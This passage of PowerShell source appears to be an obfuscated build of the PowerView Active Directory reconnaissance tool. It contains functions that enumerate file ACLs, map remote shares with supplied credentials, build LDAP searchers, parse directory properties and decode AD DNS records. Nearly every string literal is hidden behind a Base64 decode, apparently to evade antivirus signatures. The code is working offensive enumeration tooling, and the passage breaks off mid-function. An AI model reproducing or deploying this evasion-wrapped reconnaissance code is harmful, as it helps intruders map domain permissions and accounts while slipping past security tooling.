                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0V4ZWN1dGU=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUFsbG93ZWQ=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMTAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzU3lzdGVtU2VjdXJpdHk=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDEwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3luY2hyb25pemU=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDA4MDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVPd25lcg==")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDA0MDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVEQUM=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAyMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZENvbnRyb2w=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAxMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRl")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDEwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVBdHRyaWJ1dGVz")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDA4MA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEF0dHJpYnV0ZXM=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDA0MA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRlQ2hpbGQ=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAyMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhlY3V0ZS9UcmF2ZXJzZQ==")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAxMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVFeHRlbmRlZEF0dHJpYnV0ZXM=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwOA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEV4dGVuZGVkQXR0cmlidXRlcw==")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwNA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXBwZW5kRGF0YS9BZGRTdWJkaXJlY3Rvcnk=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVEYXRhL0FkZEZpbGU=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMQ=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZERhdGEvTGlzdERpcmVjdG9yeQ==")))
            }

            $SimplePermissions = @{
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxZjAxZmY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnVsbENvbnRyb2w=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMzAxYmY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9kaWZ5")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwYTk="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEFuZEV4ZWN1dGU=")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAxOWY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEFuZFdyaXRl")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwODk="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZA==")))
                [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAxMTY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU=")))
            }

            $Permissions = @()

            
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ConvertArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) $TargetPath
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZVN5c3RlbVJpZ2h0cw=="))) (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2U="))) $Name
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlTSUQ="))) $SID
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzQ29udHJvbFR5cGU="))) $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZpbGVBQ0w="))))
                    $Out
                }
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QYXRoQWNsXSBlcnJvcjogezB9"))) -f $_)
            }
        }
    }

    END {
        
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWRzcGF0aA==")))) {
            if (($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2lkaGlzdG9yeQ=="))))) {
                
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXB0eXBl")))) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudHR5cGU=")))) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0Z3VpZA==")))) {
                
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcmFjY291bnRjb250cm9s")))) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRzZWN1cml0eWRlc2NyaXB0b3I=")))) {
                
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI=")))] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA=")))] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzY3JldGlvbmFyeUFjbA==")))] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtQWNs")))] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWNjb3VudGV4cGlyZXM=")))) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVWRVI=")))
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29u")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29udGltZXN0YW1w")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHdkbGFzdHNldA==")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29mZg==")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmFkUGFzc3dvcmRUaW1l")))) ) {
                
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGlnaFBhcnQ="))), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG93UGFydA=="))),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHh7MDp4OH17MTp4OH0="))) -f $High, $Low)))
                }
                else {
                    
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGlnaFBhcnQ="))), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG93UGFydA=="))),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHh7MDp4OH17MTp4OH0="))) -f $High, $Low)
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtTERBUFByb3BlcnR5XSBlcnJvcjogezB9"))) -f $_)
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtTERBUFByb3BlcnR5XSBFcnJvciBwYXJzaW5nIExEQVAgcHJvcGVydGllcyA6IHswfQ=="))) -f $_)
    }
}








function Get-DomainSearcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LiRVc2VyRG9tYWlu"))) -f $($ENV:LOGONSERVER -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))),''))
                }
            }
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LiRUYXJnZXREb21haW4="))) -f $($ENV:LOGONSERVER -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))),''))
            }
        }
        else {
            
            write-verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z2V0LWRvbWFpbg==")))
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
            
            $BindServer = $Server
        }

        $SearchString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLw==")))

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))
            }
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZVByZWZpeA==")))]) {
            $SearchString += $SearchBasePrefix + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) {
            if ($SearchBase -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkdDOi8v")))) {
                
                $DN = $SearchBase.ToUpper().Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))
                $SearchString = ''
            }
            else {
                if ($SearchBase -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkxEQVA6Ly8=")))) {
                    if ($SearchBase -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLy4rLy4r")))) {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9ezB9"))) -f $($TargetDomain.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LERDPQ=="))))))
            }
        }

        $SearchString += $DN
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIGJhc2U6ICRTZWFyY2hTdHJpbmc=")))

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TZWFyY2hlcl0gVXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIGZvciBMREFQIGNvbm5lY3Rpb24=")))
            
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA=="))) { [System.DirectoryServices.SecurityMasks]::Dacl }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA="))) { [System.DirectoryServices.SecurityMasks]::Group }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ=="))) { [System.DirectoryServices.SecurityMasks]::None }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI="))) { [System.DirectoryServices.SecurityMasks]::Owner }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA=="))) { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
            
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {


    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
            }
            $Name
        }
    }

    PROCESS {
        
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W3N0YXRpY10=")))
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LnsxfS57Mn0uezN9"))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QQ==")))
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlM=")))
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q05BTUU=")))
        }

        elseif ($RDataType -eq 6) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09B")))
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFRS")))
        }

        elseif ($RDataType -eq 13) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SElORk8=")))
        }

        elseif ($RDataType -eq 15) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVg=")))
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFhU")))
        }

        elseif ($RDataType -eq 28) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QUFBQQ==")))
        }

        elseif ($RDataType -eq 33) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1JW")))
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
        }

        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXBkYXRlZEF0U2VyaWFs"))) $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFRM"))) $TTL
        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWdl"))) $Age
        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZVN0YW1w"))) $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGF0YQ=="))) $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
